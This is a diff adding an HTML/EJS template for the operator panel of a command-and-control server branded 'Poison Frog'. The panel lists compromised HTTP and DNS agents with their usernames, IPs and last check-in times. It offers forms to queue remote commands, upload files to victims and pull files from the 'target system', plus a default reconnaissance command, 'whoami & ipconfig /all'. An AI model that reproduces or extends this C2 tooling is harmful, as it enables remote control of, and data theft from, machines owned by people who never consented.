@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-type" content="text/html; charset=utf-8" />
+	<title><%= agentDetails[0] %></title>
+	<link rel="stylesheet" href="css/style.css" type="text/css" media="all" />
+
+	<script>
+		window.onload = function() {
+			//console.log("start function");
+			var x = setInterval(function() {
+				var lasttime = new Date(document.getElementById("visitTime").innerHTML);
+				var now_time = new Date(document.getElementById("time_now").innerHTML);
+				var distance = now_time.getTime() - lasttime.getTime();
+				now_time.setSeconds(now_time.getSeconds() + 1);
+
+				document.getElementById("time_now").innerHTML = now_time.toString();
+				
+				var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+				var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+				var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+				var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+				document.getElementById("timmer").innerHTML = days + "d " + hours + ":" + minutes + ":" + seconds;
+
+			}, 1000);
+		}
+
+		var auto_refresh = setInterval(
+			function (){
+				location.reload();
+			}, 120000); 
+
+		function sendDefaultCommand() {
+
+			var f_agentId = document.getElementById("f_agentId").value;
+			var f_agentType = document.getElementById("f_agentType").value;
+			var f_commandId = document.getElementById("f_commandId").value;
+
+			console.log("hello");
+
+			var form = document.createElement("form");
+			form.setAttribute("method", "post");
+			form.setAttribute("action", "/");
+
+			if(f_agentType == "dns") {
+
+				var f_commandType = document.getElementById("f_commandType").value;
+				
+				var hf1 = document.createElement("input");
+				hf1.setAttribute("type", "hidden");
+				hf1.setAttribute("name", "commandId");
+				hf1.setAttribute("value", f_commandId);
+				form.appendChild(hf1);
+
+				var hf2 = document.createElement("input");
+				hf2.setAttribute("type", "hidden");
+				hf2.setAttribute("name", "command");
+				hf2.setAttribute("value", "whoami & ipconfig /all");
+				form.appendChild(hf2);
+				
+				var hf3 = document.createElement("input");
+				hf3.setAttribute("type", "hidden");
+				hf3.setAttribute("name", "agentId");
+				hf3.setAttribute("value", f_agentId);
+				form.appendChild(hf3);
+
+				var hf4 = document.createElement("input");
+				hf4.setAttribute("type", "hidden");
+				hf4.setAttribute("name", "agentType");
+				hf4.setAttribute("value", f_agentType);
+				form.appendChild(hf4);
+				
+				/*var hf5 = document.createElement("input");
+				hf5.setAttribute("type", "hidden");
+				hf5.setAttribute("name", "commandType");
+				hf5.setAttribute("value", f_commandType);
+				form.appendChild(hf5);*/
+
+				var hf6 = document.createElement("input");
+				hf6.setAttribute("type", "hidden");
+				hf6.setAttribute("name", "defaultCommand");
+				hf6.setAttribute("value", "yes");
+				form.appendChild(hf6);
+				
+			} else {
+				var hf1 = document.createElement("input");
+				hf1.setAttribute("type", "hidden");
+				hf1.setAttribute("name", "commandId");
+				hf1.setAttribute("value", f_commandId);
+				form.appendChild(hf1);
+
+				var hf2 = document.createElement("input");
+				hf2.setAttribute("type", "hidden");
+				hf2.setAttribute("name", "command");
+				hf2.setAttribute("value", "whoami&ipconfig /all");
+				form.appendChild(hf2);
+				
+				var hf3 = document.createElement("input");
+				hf3.setAttribute("type", "hidden");
+				hf3.setAttribute("name", "agentId");
+				hf3.setAttribute("value", f_agentId);
+				form.appendChild(hf3);
+
+				var hf4 = document.createElement("input");
+				hf4.setAttribute("type", "hidden");
+				hf4.setAttribute("name", "agentType");
+				hf4.setAttribute("value", f_agentType);
+				form.appendChild(hf4);
+				
+				/*var hf5 = document.createElement("input");
+				hf5.setAttribute("type", "hidden");
+				hf5.setAttribute("name", "commandType");
+				hf5.setAttribute("value", f_commandType);
+				form.appendChild(hf5);*/
+
+				var hf6 = document.createElement("input");
+				hf6.setAttribute("type", "hidden");
+				hf6.setAttribute("name", "defaultCommand");
+				hf6.setAttribute("value", "yes");
+				form.appendChild(hf6);
+			}
+			
+			document.body.appendChild(form);
+			form.submit();
+		}
+	</script>
+</head>
+
+
+
+<body>
+
+
+
+
+<div id="header">
+	<div class="shell">
+		<!-- Logo + Top Nav -->
+		<div id="top">
+			<h1>Prepare for poison.</h1>
+			<div id="top-navigation">
+				<!-- <span>|</span> -->
+				<span id="timmer">00:00</span>
+				Welcome to <strong>Poison Frog</strong> panel.
+			</div>
+		</div>
+		<!-- End Logo + Top Nav -->
+		
+		<!-- Main Nav -->
+		<div id="navigation">
+			<ul>
+			    <li onClick="javascript:window.location.href='/in/http'"> <span>HTTP agents</span></li>
+			    <li onClick="javascript:window.location.href='/in/dns'" > <span>DNS agents</span></li>
+			</ul>
+		</div>
+		<!-- End Main Nav -->
+	</div>
+</div>
+<!-- End Header -->
+
+<!-- Container -->
+<div  id="container" >
+	<div class="shell">
+		
+		<br />
+		<!-- Main -->
+		<div id="main">
+			<div class="cl">&nbsp;</div>
+			
+			<!-- Content -->
+			<div id="content">
+								<div class="box">
+					<!-- Box Head -->
+					<div class="box-head">
+						<h2>Agent Details</h2>
+					</div>
+					<!-- End Box Head -->
+					
+					<form action="/" enctype="multipart/form-data" method="POST">
+						
+						<!-- Form -->
+						<div>
+						<center>	<table  id="showdetil">
+							<tr><td><ul style="list-style-type: none;">
+								<li><h2>ID: <%= agentDetails[0] %></h2></li>
+								<li><h2>Whoami: <%= agentDetails[1] %></h2></li>
+								</ul>
+									</td><td>
+									<ul style="list-style-type: none;">
+											<li><h2>IP: <%= agentDetails[2] %></h2></li>		
+								<li><h2><p id="time_now" hidden><%= current_time.toString() %></p><p id="visitTime" hidden><%= agentDetails[3].toString() %></p>LastTime: <%= agentDetails[3] %></h2></li>
+							</ul>
+							</td></tr>
+							</table>	</center>
+						</div>
+		
+
+						<!-- End Form -->
+
+						<!-- Form Buttons -->
+
+						<!-- End Form Buttons -->
+					</form>
+				</div>	
+				<!-- Box -->
+				<div class="box">
+					<!-- Box Head -->
+					<div class="box-head">
+						<h2>Add New Command</h2>
+					</div>
+					<!-- End Box Head -->
+					
+					<form action="/" enctype="multipart/form-data" method="POST">
+						
+						<!-- Form -->
+						<div class="form">
+							<input id="f_agentId" name="agentId" 	type="hidden"	value="<%= agentDetails[0] %>" />
+							<input id="f_commandId" name="commandId" type="hidden"	value="<%= commandId %>" />
+							<input id="f_whoami" name="whoami" 	type="hidden" 	value="<%= agentDetails[1] %>" />
+							<input id="f_ip" name="ip" 		type="hidden" 	value="<%= agentDetails[2] %>" />
+							<input id="f_first" name="first" 	type="hidden" 	value="<%= agentDetails[3] %>" />
+							<input id="f_agentType" name="agentType" type="hidden" 	value="<%= agentDetails[4] %>" />
+							<p>
+								<label>Command</label>
+								<input type="text" name="command" class="field size1" />
+							</p>
+							<p>
+								<label>Upload File</label>
+								<input type="file" name="uploadFile" class="field size1" />
+							</p>
+							<p>
+								<label>Download File</label>
+								<input type="text" name="downloadAdr" placeholder="File address in target system" class="field size1" />
+							</p>
+						</div>
+
+						<!-- End Form -->
+						
+						<!-- Form Buttons -->
+						<div id="form_buttons" class="buttons">
+							<input id="submit_button" type="submit" class="button"  value="RUN" />
+							<% if(agentDetails[4]=="dns") {  %><div id="commandTypeDiv"><input id="f_commandType" type="checkbox" name="commandType">Text Request</input>  </div> <% } %>
+							
+						</div>
+						<!-- End Form Buttons -->
+					</form>
+				</div>
+				<!-- End Box -->
+
+				<!-- Box -->
+				<div class="box">
+					<!-- Box Head -->
+					<div class="box-head" style="height: 42px; inline-height: 42px;" >
+						<h2 class="left">Count: <%= commands.length %></h2>
+						<div class="right">
+							<!-- <label>search articles</label>
+							<input type="text" class="field small-field" /> -->
+							<input id="default_button" onclick="sendDefaultCommand()" type="submit" class="button" value="Default Command"/>
+						</div>
+					</div>
+					<!-- End Box Head -->	
+
+					<!-- Table -->
+					<!--<div class="table" id="command_table">-->
+					<div class="table">
+						<table id="command_table" width="100%" border="0" cellspacing="0" cellpadding="0" >
+							<tr>
+								<th width="13"><input type="checkbox" class="checkbox" /></th>
+								<th style="display:none;" >ID</th>
+								<th>Command/Upload/Download</th>
+								<!-- <th>Date</th> -->
+								<th>State</th>
+								<th width="110" class="ac">Delete</th>
+							</tr>
+							<% for(var i = commands.length-1 ; i > -1; i--) { %>
+								<tr style="cursor: pointer;" ><!-- class="odd" -->
+									<td class="" onClick="javascript:window.location.href='/res/<%= agentDetails[4] %>-<%= agentDetails[0] %>-<%= commands[i][0] %>'" ><input type="checkbox" class="checkbox" /><input type="hidden" name="commandId" value="<%=  commands[i][0] %>" /></td>
+									<td  style="display:none;" onClick="javascript:window.location.href='/<%= agentDetails[4] %><><%= commands[i][0] %>'" ><h3><%= commands[i][0] %></h3></td>
+									<td onClick="javascript:window.location.href='/res/<%= agentDetails[4] %>-<%= agentDetails[0] %>-<%= commands[i][0] %>'"><h3 id="comandBody" ><% if(commands[i][1] != "not") { %> <div id="command" title="Command: <%=  commands[i][1] %>" >Command: <%= commands[i][1] %></div> <% } if(commands[i][2] != "not") { %> <div id="upload" title="Upload: <%= commands[i][2] %>" >Upload: <%= commands[i][2] %></div> <% } if(commands[i][4] != "not") { %> <div id="download" title="Download: <%= commands[i][4] %>" >Download: <%= commands[i][4] %></div> <% }  %></h3></td>
+									<!-- <td onClick="javascript:window.location.href='/res/<%= agentDetails[4] %>-<%= agentDetails[0] %>-<%= commands[i][0] %>'"><%= (commands[i][0]).substr(0, 1)+"/"+(commands[i][0]).substr(1, 2)+"_"+(commands[i][0]).substr(3, 2)+":"+(commands[i][0]).substr(5, 2)+":"+(commands[i][0]).substr(7, 2) %></td> -->
+									<td onClick="javascript:window.location.href='/res/<%= agentDetails[4] %>-<%= agentDetails[0] %>-<%= commands[i][0] %>'"><% if(commands[i][(commands[i].length-1)]=="0") {%>In Queue<%} else if(commands[i][(commands[i].length-1)]=="01") {%>Sending<%} else if(commands[i][(commands[i].length-1)]=="1") {%>Sended<%} else if(commands[i][(commands[i].length-1)]=="12") {%>Receiving<%} else {%>Received<%}%></td>
+									<td onClick="javascript:window.location.href='/delcmd/<%= agentDetails[4] %>-<%= agentDetails[0] %>-<%= commands[i][0] %>'"><a class="ico del">Delete</a></td>
+								</tr>
+							
+							<% } %>
+							
+							
+
+							
+						</table>
+						
+						
+						<script>
+function sortTable(n) {
+  var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
+  table = document.getElementById("command_table");
+  switching = true;
+  // Set the sorting direction to ascending:
+  dir = "asc";
+  /* Make a loop that will continue until
+  no switching has been done: */
+  while (switching) {
+    // Start by saying: no switching is done:
+    switching = false;
+    rows = table.rows;
+    /* Loop through all table rows (except the
+    first, which contains table headers): */
+	
+    for (i = 1; i < (rows.length - 1); i++) {
+      // Start by saying there should be no switching:
+      shouldSwitch = false;
+      /* Get the two elements you want to compare,
+      one from current row and one from the next: */
+      x = rows[i].getElementsByTagName("TD")[n];
+      y = rows[i + 1].getElementsByTagName("TD")[n];
+      /* Check if the two rows should switch place,
+      based on the direction, asc or desc: */
+      if (dir == "asc") {
+        if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
+          // If so, mark as a switch and break the loop:
+          shouldSwitch = true;
+          break;
+        }
+      } else if (dir == "desc") {
+        if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
+          // If so, mark as a switch and break the loop:
+          shouldSwitch = true;
+          break;
+        }
+      }
+    }
+    if (shouldSwitch) {
+      /* If a switch has been marked, make the switch
+      and mark that a switch has been done: */
+      rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
+      switching = true;
+      // Each time a switch is done, increase this count by 1:
+      switchcount ++;
+    } else {
+      /* If no switching has been done AND the direction is "asc",
+      set the direction to "desc" and run the while loop again. */
+      if (switchcount == 0 && dir == "asc") {
+        dir = "desc";
+        switching = true;
+      }
+    }
+  }
+}
+</script>
+
+
+					</div>
+					<!-- Table -->
+				</div>
+				<!-- End Box -->
+			</div>
+			<div class="cl">&nbsp;</div>			
+		</div>
+		<!-- Main -->
+	</div>
+</div>
+<!-- End Container -->
+
+<!-- Footer -->
+<div id="footer">
+	<div class="shell">
+		<span class="left">&copy; Poison frog</span>
+		<span class="right">
+			Changed by <a href="#" target="_blank" title="The Sweetest CSS Templates WorldWide">Poison Frogs Team</a>
+		</span>
+	</div>
+</div>
+<!-- End Footer -->
+
+
+<script>
+function sortTable2(n) {
+  var table, rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
+  table = document.getElementById("command_table");
+  switching = true;
+  // Set the sorting direction to ascending:
+  dir = "asc";
+  /* Make a loop that will continue until
+  no switching has been done: */
+  while (switching) {
+    // Start by saying: no switching is done:
+    switching = false;
+    rows = table.rows;
+    /* Loop through all table rows (except the
+    first, which contains table headers): */
+	
+    for (i = 1; i < (rows.length - 1); i++) {
+      // Start by saying there should be no switching:
+      shouldSwitch = false;
+      /* Get the two elements you want to compare,
+      one from current row and one from the next: */
+      x = rows[i].getElementsByTagName("TD")[n];
+      y = rows[i + 1].getElementsByTagName("TD")[n];
+      /* Check if the two rows should switch place,
+      based on the direction, asc or desc: */
+        if (true) {
+        if (x.innerHTML.toLowerCase() < y.innerHTML.toLowerCase()) {
+          // If so, mark as a switch and break the loop:
+          shouldSwitch = true;
+          break;
+        }
+      }
+	  else if (dir == "desc") {
+        if (x.innerHTML.toLowerCase() > y.innerHTML.toLowerCase()) {
+          // If so, mark as a switch and break the loop:
+          shouldSwitch = true;
+          break;
+        }
+      }
+    }
+    if (shouldSwitch) {
+      /* If a switch has been marked, make the switch
+      and mark that a switch has been done: */
+      rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
+      switching = true;
+      // Each time a switch is done, increase this count by 1:
+      switchcount ++;
+    } else {
+      /* If no switching has been done AND the direction is "asc",
+      set the direction to "desc" and run the while loop again. */
+      if (switchcount == 0 && dir == "asc") {
+        dir = "desc";
+        switching = true;
+      }
+    }
+  }
+  
+}
+document.getElementById("demo").innerHTML = sortTable2(1);
+
+</script>
+
+
+
+
+</body>
+</html>
